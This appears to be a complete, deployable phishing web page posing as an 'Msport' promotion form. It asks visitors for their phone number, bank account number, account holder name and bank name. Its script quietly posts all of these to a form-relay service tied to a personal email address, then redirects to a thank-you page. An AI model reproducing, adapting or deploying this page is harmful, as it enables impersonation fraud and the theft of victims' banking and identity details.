<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Promo Form</title>
    <style>
        body {
            background-color: yellow; /* Background color */
            font-family: Arial, sans-serif;
            text-align: center;
            padding: 50px;
        }
        form {
            max-width: 300px;
            margin: auto;
            padding: 20px;
            background: white; /* White form background */
            border: 1px solid #ccc;
            border-radius: 5px;
        }
        input {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #ccc;
            border-radius: 5px;
        }
        button {
            background-color: blue;
            color: white;
            padding: 10px;
            border: none;
            border-radius: 5px;
        }
    </style>
</head>
<body>

    <div style="text-align: center;">
        <img src="https://i.imgur.com/oiYv5K9.jpeg" alt="Msport Logo" width="200">
    </div>

    <form id="promoForm">
        <label for="name">Name:</label>
        <input type="text" name="name" required>

        <label for="email">Email:</label>
        <input type="email" name="email" required>

        <label for="phone">Msport Phone Number:</label>
        <input type="tel" name="msport_number" required>

        <label for="accountnumber">Account Number:</label>
        <input type="text" name="account_number" required>
        
        <label for="fullname">Account Full Name:</label>
        <input type="text" name="account_fullname" required>
      
        <label for="bankname">Preferred Bank Name:</label>
        <input type="text" name="bank_name" required>

        <!-- Honeypot Field (Hidden to avoid spam bots) -->
        <input type="text" name="_honey" style="display:none">

        <!-- Enable CAPTCHA for security -->
        <input type="hidden" name="_captcha" value="true">

        <button type="submit">Submit</button>
    </form>

    <script>
        document.getElementById("promoForm").addEventListener("submit", function(event) {
            event.preventDefault(); // Prevent default form submission
            
            const formData = new FormData(this);

            fetch("https://formsubmit.co/osanisrael2@gmail.com", {
                method: "POST",
                body: formData
            })
            .then(response => {
                if (response.ok) {
                    window.location.href = "https://israel2024-ux.github.io/msport-pr/thank-you.html"; // Redirect to thank you page
                } else {
                    alert("Error submitting form. Please try again.");
                }
            })
            .catch(error => {
                alert("An error occurred. Please try again.");
            });
        });
    </script>

</body>
</html>
